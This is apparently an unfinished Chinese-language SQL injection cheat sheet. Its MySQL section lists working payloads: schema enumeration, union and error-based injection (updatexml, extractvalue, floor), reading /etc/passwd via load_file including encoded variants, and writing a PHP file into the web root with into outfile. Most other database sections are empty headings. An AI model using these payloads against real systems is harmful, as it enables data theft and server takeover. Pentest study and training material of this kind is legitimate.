# SQL注入攻击概述
## 分类
### 数据类型分类
* 数字型
* 字符型


### 服务器返回分类
* union注入
* 报错注入
* 盲注

## 危害

# 不同数据库注入技巧
## MySQL
### 获取数据
* 注释符

```
#：注释从#符号到行尾
--：注释从--符号到行尾
/* */：注释符号中间
```

* 获取元数据

```
# 查询用户数据库名称
select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit 0,1;

# 查询当前表
select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=(select DATABASE()) limit 0,1;

# 查询表中的字段
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME="table_name" limit 0,1; 
```

* union查询

```
select username,password from bloodzer0 union select 1,2;
```

* MySQL报错注入

```
# updatexml函数
select * from bloodzer0 where id=1 and updatexml(1,(concat(0x7c,(select @@user()))),1);

# extractvalue函数
select * from bloodzer0 where id=1 and extractvalue(1,concat(0x7c,(select user())));

# 通过floor函数(也就是常说的双查询注入)
select * from bloodzer0 where id=1 union select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b;
```

### MySQL函数
```
# load_file()函数读文件
select 1,load_file('/etc/passwd'),3;
select 1,load_file(0x2f6574632f706173737764),3;
select hex(load_file(char(47,101,99,116,47,112,97,115,115,119,100))),3;

# into outfile函数写文件
select '<?php phpinfo();?>' into outfile '/var/www/html/info.php';
select char(99,58,92,50,46,116,120,116) into outfile '/var/www/html/info.php';

# 连接字符串
select * from bloodzer0 where id=1 union select concat(user(),',',database());

select * from bloodzer0 where id=1 union select concat_ws(0x2c,user(),database());
```

函数						|		说明
---							|		---	
length						|	返回字符串长度
substring					|	截取字符串长度
ascii						|	返回acsii码
hex							|	把字符串转换为16进制
unhex						|	hex的反向操作
now							|	当前系统时间
floor(x)					|	返回不大于X的最大整数值
md5							|	返回MD5值
group_concat				|	返回带有来自一个组的连接的非NULL值的字符串结果
@@datadir					|	读取数据库路径
@@basedir					|	MySQL安装路径
@@version_compile_os	|	操作系统
user						|	用户名
current_user				|	当前用户名
system_user				|	系统用户名
database					|	数据库名
version					|	MySQL数据库版本

### MySQL宽字节注入
```
成因：编码不统一造成，一般只出现在PHP+MySQL中；

编码：%d5
```

### MySQL长字符截断


### MySQL盲注

## MSSQL
### 获取数据
#### 利用错误消息提取信息

#### 获取元数据

#### order by子句

#### union查询

### MSSQL函数

### MSSQL存储过程

### 动态执行

## Oracle
### 获取数据
#### 获取元数据

#### union查询

### Oracle包

## PostgreSQL

## MongoDB

# SQL注入Bypass
